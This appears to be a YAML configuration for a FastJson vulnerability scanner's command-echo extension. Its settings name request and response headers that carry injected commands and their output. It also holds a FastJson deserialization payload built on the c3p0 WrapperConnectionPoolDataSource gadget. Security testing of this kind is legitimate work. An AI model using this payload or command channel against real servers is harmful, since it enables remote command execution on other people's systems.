# 应用程序配置
application:
  # 命令回显扩展
  cmdEchoExtension:
    config:
      isStart: true
      maxExecutionTime: 10
      # 提供商
      # 声明使用 Application.CmdEchoExtension.ExtensionMethod 的哪个类,为该扩展提供服务
      provider: "CmdEchoScan"
      issueName: "FastJson-CmdEcho"
      # 命令输入点字段名称
      # 发送命令回显的Header字段名称
      # 注意: 设置以后,所有的poc都要记得支持这个字段进行命令输入
      commandInputPointField: "cache"
      # 命令输出点字段名称
      # 接收命令回显的字段名称
      # 注意1:
      #   输入"BODY"为在响应体中查找命令输出点
      #   输入其它的,例如"Content-MD5"表示在Header字段中查找命令输出点
      # 注意2: 设置以后,所有的poc都要记得支持这个字段进行命令输出
      commandOutputPointField: "Content-MD5"
      payloads:
        - "{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"},\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:;\"}}"
